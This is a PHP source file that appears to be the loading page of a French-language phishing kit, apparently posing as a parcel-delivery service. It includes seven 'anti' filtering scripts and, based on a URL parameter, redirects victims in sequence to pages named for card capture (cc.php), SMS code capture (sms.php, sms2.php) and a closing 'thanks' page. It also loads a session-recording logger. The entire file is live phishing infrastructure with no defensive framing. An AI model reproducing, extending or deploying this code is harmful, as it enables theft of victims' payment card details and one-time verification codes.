<?php
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";

session_start();
$code = $_GET['code'];
if($code === "action1"){
header('Refresh: 5; URL=cc.php');
}
elseif($code === "action2"){
header('Refresh: 30; URL=sms.php');
}
elseif($code === "action3"){
header('Refresh: 30; URL=sms2.php');
}
elseif($code === "action4"){
header('Refresh: 30; URL=thanks.php');
}
else{
    header("location: index.php");
}
?>
<html lang="fr"><head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="session_hash" content="878e284e42bdf74fa493cea97908bbdf">
    <meta name="visit_id" content="237">
        <link rel="stylesheet" href="../assets/app.css">
  <style>
    #loading {
    background: url('assets/loading.gif') no-repeat center center;
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    z-index: 9999999;
}
  </style>
  </head>
  <body style="background-color: white;">
    <title>Loading</title>
    <link rel="icon" type="image/ico" href="https://dispatching-centre.lasamericascargo.com/images/favicon.gif">
  <script src="https://cdn.lr-in.com/logger-1.min.js" async=""></script></head>
  <div id="loading"></div>
</body>
</html>